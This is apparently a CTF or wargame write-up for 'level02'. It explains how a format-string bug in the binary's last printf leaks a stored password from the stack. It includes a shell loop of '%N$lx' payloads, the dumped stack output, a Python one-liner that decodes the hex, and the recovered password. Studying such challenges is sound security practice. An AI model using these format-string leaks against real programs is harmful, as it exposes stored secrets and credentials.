Here the program open the .pass of the next level, then read it and store it in a buffer which is on the stack.
Then it ask for a username and a password.

We see that if the password is the same as the buffer where is stored the .pass, it will open a shell.

   0x0000000000400a63 <+591>:   callq  0x400670 <strncmp@plt>
   0x0000000000400a68 <+596>:   test   %eax,%eax
  
   [...]
   
   0x0000000000400a8a <+630>:   callq  0x4006b0 <system@plt>


So what we want to do is display the stack to check what is inside the buffer which contains .pass

First of all we tried like usual to display the stack with GDB.
But the problem is when we run the program with GDB it doesn't have the privileged access to open .pass

We noticed a bunch of printf in the code.
We are going to exploit the last printf with a format string exploit
That last printf display the buffer where is stored the username.

We are going to write a small python script to exploit it and display the stack

for i in {1..50}; do python -c "print '%$i\$lx'" | ./level02 | grep 'does'; done

It will display this :

7fffffffe500 does not have access!
0 does not have access!
0 does not have access!
2a2a2a2a2a2a2a2a does not have access!
2a2a2a2a2a2a2a2a does not have access!
7fffffffe6f8 does not have access!
1f7ff9a08 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
100000000 does not have access!
0 does not have access!
756e505234376848 does not have access!
45414a3561733951 does not have access!
377a7143574e6758 does not have access!
354a35686e475873 does not have access!
48336750664b394d does not have access!
0 does not have access!
786c24383225 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
0 does not have access!
2900000000 does not have access!
602010 does not have access!
0 does not have access!
7ffff7a3d7ed does not have access!
0 does not have access!
7fffffffe6f8 does not have access!
100000000 does not have access!
400814 does not have access!
0 does not have access!
12f978e02a5b7b3a does not have access!
400730 does not have access!

We notice 5 lines in a row that may look like the password
What we are going to do is convert these hex values into strings and we'll have to reverse them because of endianness

python -c 'print("756e505234376848".decode("hex")[::-1]+"45414a3561733951".decode("hex")[::-1]+"377a7143574e6758".decode("hex")[::-1]+"354a35686e475873".decode("hex")[::-1]+"48336750664b394d".decode("hex")[::-1])'

This will display : Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H

You can su to level03 directly or use it has the password in the program to open the shell in which if you cat /home/users/level03/.pass will display the same password
